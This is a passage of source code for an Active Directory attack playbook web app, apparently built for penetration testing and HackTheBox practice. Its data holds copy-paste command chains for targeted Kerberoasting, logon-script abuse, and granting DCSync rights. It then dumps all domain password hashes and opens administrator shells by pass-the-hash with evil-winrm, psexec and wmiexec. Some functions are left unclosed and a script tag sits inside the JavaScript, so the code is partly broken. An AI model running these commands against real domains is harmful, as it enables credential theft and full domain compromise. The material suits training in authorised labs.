  {n:4,t:'Wait for user logon',cmd:'# Monitor SMB server for connection\n# nxc smb <TARGET_IP> -u <USER> -p <PASS> -x "logoff" can force reconnect on some configs',note:'Script executes in user context when they next log in.'},
  {n:5,t:'🧹 CLEANUP: Remove scriptPath',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set object <TARGET> scriptPath',note:'No -v = delete attribute.',cleanup:true}

{id:'writespn',cat:'cred',icon:'🍺',name:'WriteSPN → Targeted Kerberoasting',impact:'medium',noise:'low',
 prereq:'WriteProperty on servicePrincipalName OR GenericWrite/GenericAll on target user',
 desc:'<strong>What:</strong> Add SPN to a high-value target with a likely-weak password. KDC issues TGS encrypted with their hash — crack offline. Set → request → remove immediately.',

  {n:2,t:'Add fake SPN',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set object <TARGET> servicePrincipalName -v \'HTTP/fakesvc.<DOMAIN>\'',note:'Format: ServiceClass/Hostname. Does not need to resolve.'},
  {n:3,t:'Request TGS hash',cmd:'GetUserSPNs.py \'<DOMAIN>/<USER>:<PASS>\' -dc-ip <HOST> -request -outputfile kerberoast.txt',note:'Gets $krb5tgs$23$... hash.'},

  {n:5,t:'IMMEDIATELY remove SPN',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' set object <TARGET> servicePrincipalName',note:'No -v = delete attribute.',cleanup:true}

// ── HTB FOREST — COMPLETE CHAIN ───────────────────────────────
{id:'forest_chain',cat:'new',icon:'🌲',name:'HTB Forest — Complete Attack Chain (All Scenarios)',impact:'critical',noise:'high',
 prereq:'Fill ALL input boxes: HOST=DC IP · DOMAIN=htb.local · USER=svc-alfresco · PASS=s3rvice · DN=DC=htb,DC=local. Chain: <USER> → [MemberOf] → Account Operators → GenericAll → Exchange Windows Permissions → WriteDACL → <DOMAIN>',
 desc:'<strong>Full HTB Forest privilege escalation — all commands dynamic.</strong> Fill the input boxes at the top (HOST, DOMAIN, USER, PASS, DN) and every command auto-populates.<br><br>Chain: <code>GenericAll on group → add self to group → DCSync rights → dump hashes → DA shell</code><br><br>⚠️ <strong>DN box</strong>: type <code>DC=htb,DC=local</code> for HTB Forest (derived from your domain).',
 steps:[
  {n:1,t:'[Recon] Collect BloodHound data — map full attack path',cmd:'bloodhound-python -u <USER> -p \'<PASS>\' -d <DOMAIN> -ns <HOST> -c All --zip',note:'Upload ZIP to BloodHound CE. Mark <USER> as owned. Path should show: <USER> → Account Operators → GenericAll → Exchange Windows Permissions → WriteDACL → domain.'},
  {n:2,t:'[Recon] Verify writable objects with bloodyAD',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' get writable --right WRITE --detail',note:'Confirms what <USER> can write. Should show WRITE/GenericAll on EXCHANGE WINDOWS PERMISSIONS via Account Operators nested chain.'},
  {n:3,t:'[CMD 1] Grant yourself GenericAll on Exchange Windows Permissions group',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add genericAll \'EXCHANGE WINDOWS PERMISSIONS\' <USER>',note:'Abuses GenericAll that Account Operators has on the group (via your nested membership). Grants <USER> full control over the group object itself.'},
  {n:4,t:'[CMD 2] Add yourself to Exchange Windows Permissions group',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add groupMember \'EXCHANGE WINDOWS PERMISSIONS\' <USER>',note:'Uses the GenericAll from CMD 1. New LDAP session — AD server evaluates updated membership server-side. You now inherit WriteDACL on the domain object.'},
  {n:5,t:'[CMD 3A] Try: Grant DCSync via bloodyAD add dcsync',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' add dcsync <USER>',note:'Creates new LDAP session. AD may now see your Exchange Windows Permissions membership and allow the DACL write. Try this first. If it returns INSUFF_ACCESS_RIGHTS, use CMD 3B (dacledit) instead.'},
  {n:6,t:'[CMD 3B] Fallback: Grant DCSync via dacledit.py (if 3A failed)',cmd:'dacledit.py -action write -rights DCSync -principal <USER> -target-dn \'<DN>\' \'<DOMAIN>/<USER>:<PASS>\'',note:'⚠️ Fill DN box with DC=htb,DC=local. dacledit.py uses password auth → fresh LDAP bind → server evaluates group membership → WriteDACL respected → grants DS-Replication-Get-Changes ACEs.'},
  {n:7,t:'[CMD 4] DCSync — dump Administrator hash (targeted)',cmd:'impacket-secretsdump \'<DOMAIN>/<USER>:<PASS>\'@<HOST> -just-dc-user administrator',note:'Replicates via DRSUAPI as fake DC. Get NT hash from: Administrator:500:aad3b435...:NTHASH::: — copy the value AFTER the last colon.'},
  {n:8,t:'[CMD 4B] Alternative: dump ALL domain hashes',cmd:'impacket-secretsdump \'<DOMAIN>/<USER>:<PASS>\'@<HOST> -just-dc-ntlm',note:'Dumps every domain account NT hash. Useful if Administrator is rotated or you need service account hashes.'},
  {n:9,t:'[CMD 5A] Get DA shell — evil-winrm (WinRM, recommended)',cmd:'evil-winrm -i <HOST> -u Administrator -H <NTHASH>',note:'Replace <NTHASH> with the NT hash from secretsdump. Port 5985 must be open. Gets interactive PowerShell session as Administrator.'},
  {n:10,t:'[CMD 5B] Get DA shell — impacket-psexec (SMB, SYSTEM level)',cmd:'impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTHASH> administrator@<HOST>',note:'SMB-based. Uploads service binary → returns SYSTEM shell (higher than Admin). Replace <NTHASH> with actual NT hash. Noisy: creates Event ID 7045.'},
  {n:11,t:'[CMD 5C] Get DA shell — impacket-wmiexec (WMI, stealthier)',cmd:'impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:<NTHASH> administrator@<HOST>',note:'WMI-based. No service creation. Semi-interactive. Replace <NTHASH> with actual NT hash. Quieter than psexec.'},
  {n:12,t:'🧹 CLEANUP: Remove DCSync rights',cmd:'dacledit.py -action remove -rights DCSync -principal <USER> -target-dn \'<DN>\' \'<DOMAIN>/<USER>:<PASS>\'',note:'Removes DS-Replication ACEs. Use same DN as CMD 3B.',cleanup:true},
  {n:13,t:'🧹 CLEANUP: Leave Exchange Windows Permissions group',cmd:'bloodyAD --host <HOST> -d <DOMAIN> -u <USER> -p \'<PASS>\' remove groupMember \'EXCHANGE WINDOWS PERMISSIONS\' <USER>',note:'Restore original group membership.',cleanup:true}
 ],
 opsec:['Fill input boxes: HOST=10.129.x.x, DOMAIN=htb.local, USER=svc-alfresco, PASS=s3rvice, DN=DC=htb\,DC=local','<NTHASH> = paste NT hash manually from secretsdump (not in input boxes)','Event ID 4728 (group join) + 4670 (DACL change) + 4662 (DCSync replication) — all logged','Try CMD 3A first; if INSUFF_ACCESS_RIGHTS use CMD 3B (dacledit.py)']}
];

// ============================================================
// SETACTIVE — update sidebar highlight
// ============================================================
function setActive(id){
  document.querySelectorAll('.special-nav-btn').forEach(b=>b.classList.remove('active'));
  const el=document.getElementById(id);if(el)el.classList.add('active');
  document.querySelectorAll('.nav-item').forEach(b=>b.classList.remove('active'));
}

// ============================================================
// SHOW ATTACKS PAGE
// ============================================================
let currentAttackId = null;
function showAttacks(attackId){
  setActive('snb-atk');
  currentAttackId=attackId||null;
  const content=document.getElementById('content');
  if(attackId){
    const a=attacks.find(x=>x.id===attackId);
    if(!a)return;
    content.innerHTML=renderAttackDetail(a);
    updateShowingCount();
    return;
  }
  // Category grouping
  const cats={privesc:{label:'🛡️ Privilege Escalation',items:[]},cred:{label:'🔑 Credential Attacks',items:[]},deleg:{label:'🔄 Delegation Attacks',items:[]},dns:{label:'🌐 DNS Attacks',items:[]},adcs:{label:'📜 ADCS Attacks',items:[]},exec:{label:'💻 Lateral Movement & Execution',items:[]},new:{label:'💥 New / Advanced',items:[]}};
  attacks.forEach(a=>{if(cats[a.cat])cats[a.cat].items.push(a)});
  let html=`<div class="page-hero"><h2>⚔️ bloodyAD Attack Playbook</h2><p>Every attack that bloodyAD can perform — step-by-step with copy-paste commands, OPSEC notes, and cleanup. Fill global inputs at the top to auto-populate all commands.</p></div>`;
  Object.values(cats).forEach(cat=>{
    if(!cat.items.length)return;
    html+=`<div class="atk-section-title">${cat.label}</div><div class="atk-grid">`;
    cat.items.forEach(a=>{
      const impactClass=a.impact==='critical'?'ab-critical':a.impact==='high'?'ab-high':'ab-medium';
      const noiseClass=a.noise==='high'?'ab-critical':a.noise==='medium'?'ab-medium':'ab-low';
      const catClass='ab-'+a.cat;
      html+=`<div class="atk-card" onclick="showAttacks('${a.id}')">
<div class="atk-card-header">
<div class="atk-card-title">${a.icon} ${a.name}</div>
<div class="atk-card-desc">${a.desc.replace(/<[^>]+>/g,'').substring(0,120)}...</div>
<div class="atk-badges">
<span class="atk-badge ${catClass}">${a.cat}</span>
<span class="atk-badge ${impactClass}">impact: ${a.impact}</span>
<span class="atk-badge ${noiseClass}">noise: ${a.noise}</span>
<span class="atk-badge ab-enum">${a.steps.length} steps</span>
</div>
</div></div>`;
    });
    html+='</div>';
  });
  content.innerHTML=html;
  updateShowingCount(attacks.length);
}

function renderAttackDetail(a){
  const impactClass=a.impact==='critical'?'ab-critical':a.impact==='high'?'ab-high':'ab-medium';
  const noiseClass=a.noise==='high'?'ab-critical':a.noise==='medium'?'ab-medium':'ab-low';
  let stepsHtml='';
  a.steps.forEach((s,i)=>{
    const isCleanup=s.cleanup||false;
    const numClass=isCleanup?'cleanup':'';
    stepsHtml+=`<div class="atk-step ${isCleanup?'cleanup-step':''}">
<div class="atk-step-header"><span class="step-num ${numClass}">${isCleanup?'♻':s.n}</span><span class="step-title">${s.t}</span></div>
<div class="step-note">${s.note}</div>
<div class="step-cmd"><code id="astep-${a.id}-${i}">${processCommand(s.cmd)}</code><button class="copy-btn" onclick="copyStep('${a.id}',${i},event)">Copy</button></div>
</div>`;
  });
  const opsecHtml=a.opsec?`<div class="atk-opsec"><strong>🔍 OPSEC Notes</strong><ul>${a.opsec.map(o=>`<li>${o}</li>`).join('')}</ul></div>`:'';
  return `<div class="atk-detail">
<div class="atk-back" onclick="showAttacks()">← Back to All Attacks</div>
<div class="atk-title-bar">
<h2>${a.icon} ${a.name}</h2>
<span class="atk-badge ${impactClass}">impact: ${a.impact}</span>
<span class="atk-badge ${noiseClass}">noise: ${a.noise}</span>
<span class="atk-badge ab-enum">${a.steps.length} steps</span>
</div>
<div class="atk-prereq"><strong>⚠️ Prerequisites</strong><span>${a.prereq}</span></div>
<div class="atk-desc-box">${a.desc}</div>
<div class="steps-label">Step-by-Step Walkthrough</div>
${stepsHtml}
${opsecHtml}
</div>`;
}

function copyStep(attackId,stepIdx,event){
  event.stopPropagation();
  const a=attacks.find(x=>x.id===attackId);
  if(!a||!a.steps[stepIdx])return;
  const raw=getRawCommand(a.steps[stepIdx].cmd);
  navigator.clipboard.writeText(raw).then(()=>{
    const btn=event.target;
    btn.classList.add('copied');btn.textContent='✓';
    showToast('Step copied!');
    setTimeout(()=>{btn.classList.remove('copied');btn.textContent='Copy'},2000);
  }).catch(()=>{showToast('Copy failed')});
}

function showEnumeration(){
  setActive('snb-enum');
  const content=document.getElementById('content');
  let html=`<div class="page-hero"><h2>🔎 Enumeration Guide</h2><p>Every bloodyAD enumeration technique — from initial recon to finding attack paths. Fill global inputs above to auto-populate commands.</p></div><div class="enum-grid">`;
  enumItems.forEach((item,idx)=>{
    let cmdsHtml='';
    item.cmds.forEach((c,ci)=>{
      cmdsHtml+=`<div style="font-size:10px;color:var(--muted);margin-bottom:3px;font-weight:600">${c.label}</div>
<div class="enum-cmd-block"><code id="ecmd-${idx}-${ci}">${processCommand(c.cmd)}</code><button class="copy-btn" onclick="copyEnumCmd(${idx},${ci},event)">Copy</button></div>`;
    });
    const outputHtml=item.output?`<div class="enum-output">${item.output}</div>`:'';
    html+=`<div class="enum-card">
<div class="enum-card-header"><span class="enum-card-icon">${item.icon}</span><span class="enum-card-title">${item.title}</span></div>

${cmdsHtml}
${outputHtml}
</div></div>`;
  });
  html+='</div>';
  content.innerHTML=html;
  updateShowingCount(enumItems.length);

function copyEnumCmd(itemIdx,cmdIdx,event){
  event.stopPropagation();
  const item=enumItems[itemIdx];
  if(!item||!item.cmds[cmdIdx])return;
  const raw=getRawCommand(item.cmds[cmdIdx].cmd);
  navigator.clipboard.writeText(raw).then(()=>{
    const btn=event.target;
    btn.classList.add('copied');btn.textContent='✓';
    showToast('Copied!');
    setTimeout(()=>{btn.classList.remove('copied');btn.textContent='Copy'},2000);
  }).catch(()=>showToast('Copy failed'));
}

// Helper: refresh attack + enum page command placeholders
function refreshAttackEnumCmds(){
  if(currentAttackId){
    const a=attacks.find(x=>x.id===currentAttackId);
    if(a){a.steps.forEach((s,i)=>{const el=document.getElementById('astep-'+a.id+'-'+i);if(el)el.innerHTML=processCommand(s.cmd)});}
  }
  enumItems.forEach((item,idx)=>{item.cmds.forEach((c,ci)=>{const el=document.getElementById('ecmd-'+idx+'-'+ci);if(el)el.innerHTML=processCommand(c.cmd)});});
}

function toggleGenBar(){
  const wrap=document.getElementById('gen-bar-wrap');
  const btn=document.getElementById('toggle-inputs-btn');
  const sidebar=document.getElementById('sidebar');
  const header=document.querySelector('.header');
  wrap.classList.toggle('collapsed');
  btn.classList.toggle('collapsed-state');
  // Adjust sidebar top to match actual header height after transition
  setTimeout(()=>{
    const hh=header.offsetHeight;
    sidebar.style.top=hh+'px';
    sidebar.style.height='calc(100vh - '+hh+'px)';
  },320);
}

function showToast(msg){
    const t=document.getElementById('toast');
    t.textContent=msg;t.classList.add('show');
    setTimeout(()=>t.classList.remove('show'),2000);

// ============================================================
// ATTACK MATRIX — full BloodHound ACE coverage from attacks.json

let mxPlatform = 'all'; // 'all' | 'win' | 'kali'
let mxSearch = '';
let mxCollapsed = new Set();

function showAttackMatrix() {
  setActive('snb-matrix');
  const content = document.getElementById('content');

  // Group by category
  const catMap = {};
  matrixData.forEach(e => {
    if (!catMap[e.cat]) catMap[e.cat] = {icon: e.catIcon, sev: e.sev, sevColor: e.sevColor, rights: {}};
    if (!catMap[e.cat].rights[e.right]) catMap[e.cat].rights[e.right] = {desc: e.rightDesc, impact: e.impact, methods: []};
    catMap[e.cat].rights[e.right].methods.push(e);
  });

  const totalMethods = matrixData.length;
  const totalWin = matrixData.reduce((a,e) => a + e.winCmds.filter(c => c && !c.startsWith('#')).length, 0);
  const totalKali = matrixData.reduce((a,e) => a + e.kaliCmds.filter(c => c && !c.startsWith('#')).length, 0);

  let html = `
  <div class="mx-hero">
    <h2>⚔️ Complete BloodHound ACE Attack Matrix</h2>
    <p>All 94 attack methods across 13 categories · ${totalWin} Windows commands · ${totalKali} Kali/Linux commands · Every single command covered with alternatives</p>
  </div>
  <div class="mx-toolbar">
    <input class="mx-search" type="text" id="mx-search-input" placeholder="🔍 Search methods, tools, commands..." oninput="mxDoSearch(this.value)">
    <div class="mx-ptoggle">
      <button class="mx-ptbtn active-all" id="mxpt-all" onclick="mxSetPlatform('all')">⚡ All</button>
      <button class="mx-ptbtn" id="mxpt-win" onclick="mxSetPlatform('win')">🪟 Windows</button>
      <button class="mx-ptbtn" id="mxpt-kali" onclick="mxSetPlatform('kali')">🐧 Kali</button>
    </div>
    <div class="mx-stat" id="mx-stat">${Object.keys(catMap).length} cats · ${totalMethods} methods</div>
    <button class="mx-ptbtn" onclick="mxExpandAll(true)">Expand All</button>
    <button class="mx-ptbtn" onclick="mxExpandAll(false)">Collapse All</button>
  </div>
  <div id="mx-content">`;

  Object.entries(catMap).forEach(([catName, catData]) => {
    const rightCount = Object.keys(catData.rights).length;
    const methodCount = Object.values(catData.rights).reduce((a,r)=>a+r.methods.length,0);
    const isCollapsed = mxCollapsed.has(catName);
    html += `
    <div class="mx-cat-section${isCollapsed?' mx-collapsed':''}" id="mxcat-${mxId(catName)}">
      <div class="mx-cat-hdr" onclick="mxToggleCat('${mxId(catName)}','${escJ(catName)}')">
        <span class="mx-cat-icon">${catData.icon}</span>
        <div class="mx-cat-info"><h3>${catName}</h3></div>
        <span class="mx-sev-badge" style="color:${catData.sevColor};border-color:${catData.sevColor}">${catData.sev}</span>
        <span class="mx-cnt">${rightCount} rights · ${methodCount} methods</span>
        <span class="mx-cat-arrow">▼</span>
      </div>
      <div class="mx-cat-body">`;

    Object.entries(catData.rights).forEach(([rightName, rightData]) => {
      html += `
      <div class="mx-right-section">
        <div class="mx-right-hdr">
          <div class="mx-right-name">${rightName}</div>
          <div class="mx-right-desc">${rightData.desc}</div>
          <span class="mx-cnt">${rightData.methods.length}</span>
        </div>`;

      rightData.methods.forEach((e, mi) => {
        html += mxRenderMethod(e, mi);
      });

      // Show alt methods and detection from the right
      if (rightData.methods[0]) {
        const e = rightData.methods[0];
        if (e.alt && e.alt.length) {
          html += `<div class="mx-method-card">
            <div class="mx-alt-box">
              <h5>🔀 Alternative Methods</h5>
              <ul>${e.alt.map(a=>`<li>${escHtml(a)}</li>`).join('')}</ul>
            </div>`;
          if (e.detection && e.detection.length) {
            html += `<div class="mx-alt-box" style="background:rgba(248,81,73,.05);border-color:rgba(248,81,73,.2)">
              <h5 style="color:var(--red)">🚨 Detection</h5>
              <ul>${e.detection.map(d=>`<li>${escHtml(d)}</li>`).join('')}</ul>
            </div>`;
          }
          html += `</div>`;
        }
      }

      html += `</div>`; // mx-right-section
    });

    html += `</div></div>`; // mx-cat-body + mx-cat-section
  });

  html += `</div>`; // mx-content
  content.innerHTML = html;
  updateShowingCount(totalMethods);
}

function mxRenderMethod(e, mi) {
  const showWin = mxPlatform === 'all' || mxPlatform === 'win';
  const showKali = mxPlatform === 'all' || mxPlatform === 'kali';

  const winToolsBadges = e.winTools.map(t => `<span class="mx-tool-badge mx-tool-win">🪟 ${escHtml(t)}</span>`).join('');
  const kaliToolsBadges = e.kaliTools.map(t => `<span class="mx-tool-badge mx-tool-kali">🐧 ${escHtml(t)}</span>`).join('');

  let cmdHtml = '';

  if (showWin && e.winCmds.length > 0) {
    cmdHtml += `<div class="mx-cmd-section">
      <div class="mx-platform-hdr win">🪟 Windows Commands</div>
      ${mxRenderCmdBlock(e.winCmds, 'win', e.id + '_w')}
    </div>`;
  }

  if (showKali && e.kaliCmds.length > 0) {
    cmdHtml += `<div class="mx-cmd-section">
      <div class="mx-platform-hdr kali">🐧 Kali / Linux Commands</div>
      ${mxRenderCmdBlock(e.kaliCmds, 'kali', e.id + '_k')}
    </div>`;
  }

  if (e.commonCmds && e.commonCmds.length > 0) {
    cmdHtml += `<div class="mx-cmd-section">
      <div class="mx-platform-hdr" style="color:var(--purple)">🔧 Universal / Cross-Platform</div>
      ${mxRenderCmdBlock(e.commonCmds, 'common', e.id + '_c')}
    </div>`;
  }

  if (!cmdHtml) {
    cmdHtml = `<div class="mx-no-cmds">No commands for selected platform</div>`;
  }

  const stepsHtml = e.steps && e.steps.length ? `
    <div class="mx-steps-box">
      <h5>📋 Steps</h5>
      <ol>${e.steps.map(s => `<li>${escHtml(s)}</li>`).join('')}</ol>
    </div>` : '';

  const searchStr = (e.method + ' ' + e.cat + ' ' + e.right + ' ' + 
                       e.winTools.join(' ') + ' ' + e.kaliTools.join(' ') + ' ' +
                       e.winCmds.join(' ') + ' ' + e.kaliCmds.join(' ')).toLowerCase();
  return `<div class="mx-method-card" data-search="${escHtml(searchStr)}">
    <div class="mx-method-name">
      <span class="mx-method-num">${mi+1}</span>
      ${escHtml(e.method)}
    </div>
    <div class="mx-tools">${winToolsBadges}${kaliToolsBadges}</div>
    ${stepsHtml}
    ${cmdHtml}
  </div>`;
}

function mxRenderCmdBlock(cmds, type, blockId) {
  // Group consecutive commands into blocks separated by comment headers
  const blocks = [];
  let cur = {header: '', cmds: []};
  cmds.forEach(c => {
    if (c.startsWith('#')) {
      if (cur.cmds.length) { blocks.push(cur); cur = {header: '', cmds: []}; }
      cur.header = c;
    } else if (c === '') {
      // blank line = separator
    } else {
      cur.cmds.push(c);
    }
  });
  if (cur.cmds.length) blocks.push(cur);

  if (!blocks.length) {
    // Just comments, no real cmds
    return `<div class="mx-no-cmds">Enumerated in tools list above</div>`;
  }

  let html = '';
  blocks.forEach((block, bi) => {
    const allCmds = block.cmds.join('\n');
    const bid = `${blockId}_${bi}`;
    html += `<div class="mx-cmd-block ${type}-block" id="mxblk-${bid}">`;
    const normCmds = mxNormCmd(allCmds);
    if (block.header) html += `<span class="mx-comment">${escHtml(block.header)}\n</span>`;
    html += `<code id="mxcode-${bid}" data-mxraw="${escHtml(normCmds)}">${mxProcessCmd(normCmds)}</code>`;
    html += `<button class="mx-copy-btn" onclick="mxCopyBlock('${bid}',${JSON.stringify(normCmds)},event)">Copy</button>`;
    html += `</div>`;
  });
  return html;
}

function mxCopyBlock(bid, text, event) {
  event.stopPropagation();
  const raw = getRawCommand(mxNormCmd(text));
  navigator.clipboard.writeText(raw).then(() => {
    const btn = event.target;
    btn.classList.add('copied'); btn.textContent = '✓';
    showToast('Copied!');
    setTimeout(() => { btn.classList.remove('copied'); btn.textContent = 'Copy'; }, 2000);
  }).catch(() => showToast('Copy failed'));
}

function mxSetPlatform(p) {
  mxPlatform = p;
  document.querySelectorAll('.mx-ptbtn').forEach(b => b.className = 'mx-ptbtn');
  document.getElementById('mxpt-' + p).classList.add('active-' + p);
  showAttackMatrix();
}

function mxDoSearch(q) {
  mxSearch = q.toLowerCase().trim();
  const cards = document.querySelectorAll('.mx-method-card[data-search]');
  let visible = 0;
  document.querySelectorAll('.mx-cat-section').forEach(sec => {
    let secVisible = 0;
    sec.querySelectorAll('.mx-right-section').forEach(rs => {
      let rsVisible = 0;
      rs.querySelectorAll('.mx-method-card').forEach(card => {
        if (!card.dataset.search) return;
        const match = !mxSearch || card.dataset.search.includes(mxSearch);
        card.style.display = match ? '' : 'none';
        if (match) { rsVisible++; secVisible++; visible++; }
      });
      rs.style.display = rsVisible > 0 ? '' : 'none';
    });
    sec.style.display = secVisible > 0 ? '' : 'none';
  });
  const stat = document.getElementById('mx-stat');
  if (stat) stat.textContent = mxSearch ? `${visible} matching methods` : `${matrixData.length} methods`;
}

function mxToggleCat(id, name) {
  const el = document.getElementById('mxcat-' + id);
  el.classList.toggle('mx-collapsed');
  if (mxCollapsed.has(name)) mxCollapsed.delete(name); else mxCollapsed.add(name);
}

function mxExpandAll(expand) {
  mxCollapsed.clear();
  document.querySelectorAll('.mx-cat-section').forEach(el => {
    if (expand) el.classList.remove('mx-collapsed');
    else el.classList.add('mx-collapsed');
  });
  if (!expand) {
    document.querySelectorAll('.mx-cat-section').forEach(el => {
      mxCollapsed.add(el.id.replace('mxcat-', ''));
    });
  }
}

function mxId(s) { return s.replace(/[^a-zA-Z0-9]/g, '_'); }

function mxNormCmd(c) {
  // Normalize attacks.json template words → <PLACEHOLDER> for processCommand()
  return c
    .replace(/\bdc-ip\b/g,'<HOST>')
    .replace(/\bdomain\.local\b/g,'<DOMAIN>')
    .replace(/\b(target-ip|target-server|session-host|sql-server|exchange-server|target-host|ca-ip)\b/g,'<TARGET>')
    .replace(/\battacker-ip\b/g,'<HOST>')
    .replace(/\bca-server\b/g,'<HOST>')
    .replace(/\bdc\.domain\.local\b/g,'<HOST>')
    .replace(/\buser\b/g,'<USER>')
    .replace(/\bpassword\b/g,'<PASS>');
}

function mxProcessCmd(cmd) {
  const dom=(document.getElementById('g-domain')||{}).value||'';
  const dn=dom?dom.split('.').map(p=>'DC='+p).join(','):'DC=domain,DC=local';
  return processCommand(mxNormCmd(cmd).replace(/<DOMAIN_DN>/g,dn));
}

<button id="theme-toggle-btn" title="Toggle theme (t)">☀</button>

<script>
(function(){
  function setTheme(theme) {
    document.documentElement.setAttribute('data-theme', theme);
    var btn = document.getElementById('theme-toggle-btn');
    if (btn) btn.textContent = theme === 'dark' ? '☀' : '🌙';
    try { localStorage.setItem('mahdiesta-theme', theme); } catch(e) {}
  }
  function toggleTheme() {
    var current = document.documentElement.getAttribute('data-theme') || 'dark';
    setTheme(current === 'dark' ? 'light' : 'dark');
  }
  document.addEventListener('keydown', function(e) {
    if (e.key === 't' || e.key === 'T') toggleTheme();
  });
  var btn = document.getElementById('theme-toggle-btn');
  if (btn) btn.addEventListener('click', toggleTheme);
  var saved = 'dark';
  try { saved = localStorage.getItem('mahdiesta-theme') || 'dark'; } catch(e) {}
  setTheme(saved);
})();
</script>
